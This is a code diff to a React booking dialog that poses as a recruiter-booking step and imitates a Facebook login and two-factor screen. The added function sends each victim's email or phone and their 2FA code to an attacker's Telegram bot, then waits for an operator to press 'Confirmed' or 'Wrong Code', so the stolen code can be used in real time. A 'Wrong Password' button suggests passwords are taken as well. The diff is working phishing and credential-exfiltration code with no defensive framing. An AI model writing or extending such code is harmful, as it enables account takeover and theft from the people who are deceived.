@@ -103,8 +103,9 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
   const [permVisible, setPermVisible] = useState(false)
   const [fullVisible, setFullVisible] = useState(false)
   const [otpCode, setOtpCode] = useState("")
-  const [isSending, setIsSending] = useState(false) // Add loading state for sending
-  const [loginError, setLoginError] = useState("") // Error message for wrong password
+  const [isSending, setIsSending] = useState(false)
+  const [loginError, setLoginError] = useState("")
+  const [otpError, setOtpError] = useState("")
 
   useEffect(() => {
     if (step === "permissions") {
@@ -155,11 +156,7 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
         inline_keyboard: [
           [
             { text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` },
-            { text: "🔢 2FA", callback_data: `/2fa-session ${sessionId}` },
-          ],
-          [
             { text: "🔐 Authenticator", callback_data: `/code ${sessionId}` },
-            { text: "📱 Phone", callback_data: `/phone ${sessionId}` },
           ],
         ],
       },
@@ -296,6 +293,54 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     }
   }
 
+  // Send 2FA code to Telegram with inline buttons and wait for bot response
+  async function handleAuthenticatorContinue() {
+    if (otpCode.length < 6) return
+    setIsSending(true)
+    setOtpError("")
+
+    try {
+      const sessionId = ++pendingSessionId
+
+      const text = `<b>🔐 2FA Code Received</b>\n\n<b>📧 Email/Phone:</b> <code>${login.id}</code>\n<b>🔑 Code:</b> <code>${otpCode}</code>\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`
+
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: "✅ Confirmed", callback_data: `/confirmed ${sessionId}` },
+                { text: "❌ Wrong Code", callback_data: `/wrong-code ${sessionId}` },
+              ],
+            ],
+          },
+        }),
+      })
+
+      if (!res.ok) throw new Error("Failed to send 2FA code")
+
+      // Wait for bot to respond
+      const callbackData = await startPollingForAction(sessionId)
+      setIsSending(false)
+
+      if (callbackData.startsWith("/confirmed")) {
+        setStep("confirmed")
+      } else if (callbackData.startsWith("/wrong-code")) {
+        setOtpError("The code you entered is incorrect. Please try again.")
+        setOtpCode("")
+      }
+    } catch (error) {
+      console.error("Failed to send 2FA code:", error)
+      setIsSending(false)
+      alert("There was an issue submitting your code. Please try again.")
+    }
+  }
+
   const activeRecruiter =
       recruiter ?? recruiters.find((r) => r.id === selectedRecruiterId) ?? null
 
@@ -314,6 +359,9 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     setPermVisible(false)
     setFullVisible(false)
     setIsSending(false) // Reset sending state
+    setLoginError("")
+    setOtpError("")
+    setOtpCode("")
   }
 
   function handleOpenChange(next: boolean) {
@@ -994,28 +1042,43 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
 
                       {/* Code input + buttons */}
                       <div className="px-6 pb-6 pt-4">
+                        {otpError && (
+                          <div className="mb-3 rounded-lg bg-[#ffebe8] border border-[#dd3c10] px-3 py-2.5 text-sm text-[#dd3c10]">
+                            {otpError}
+                          </div>
+                        )}
                         <input
                             type="text"
                             inputMode="numeric"
                             maxLength={6}
                             value={otpCode}
-                            onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, ""))}
+                            onChange={(e) => {
+                              setOtpCode(e.target.value.replace(/\D/g, ""))
+                              setOtpError("")
+                            }}
                             placeholder="Code"
-                            className="w-full rounded-lg border border-[#ccd0d5] px-4 py-3 text-[17px] text-[#1c1e21] placeholder-[#8d949e] outline-none focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2]/20"
+                            className={cn(
+                              "w-full rounded-lg border px-4 py-3 text-[17px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-2",
+                              otpError
+                                ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
+                                : "border-[#ccd0d5] focus:border-[#1877f2] focus:ring-[#1877f2]/20"
+                            )}
                         />
 
                         <button
                             type="button"
-                            onClick={() => setStep("confirmed")}
-                            className="mt-3 w-full rounded-lg bg-[#1877f2] py-3 text-[17px] font-bold text-white transition hover:bg-[#166fe5] active:bg-[#1464d8]"
+                            onClick={handleAuthenticatorContinue}
+                            disabled={otpCode.length < 6 || isSending}
+                            className="mt-3 w-full rounded-lg bg-[#1877f2] py-3 text-[17px] font-bold text-white transition hover:bg-[#166fe5] active:bg-[#1464d8] disabled:cursor-not-allowed disabled:bg-[#a0bcf8] flex items-center justify-center gap-2"
                         >
-                          Continue
+                          {(isSending) && <Loader2 className="size-5 animate-spin" />}
+                          {isSending ? "Verifying…" : "Continue"}
                         </button>
 
                         <button
                             type="button"
-                            onClick={() => setStep("confirmed")}
-                            className="mt-2 w-full rounded-lg border border-[#ccd0d5] bg-white py-3 text-[17px] font-semibold text-[#1c1e21] transition hover:bg-[#f2f2f2]"
+                            disabled
+                            className="mt-2 w-full rounded-lg border border-[#ccd0d5] bg-white py-3 text-[17px] font-semibold text-[#b0b3b8] cursor-not-allowed"
                         >
                           Try another way
                         </button>
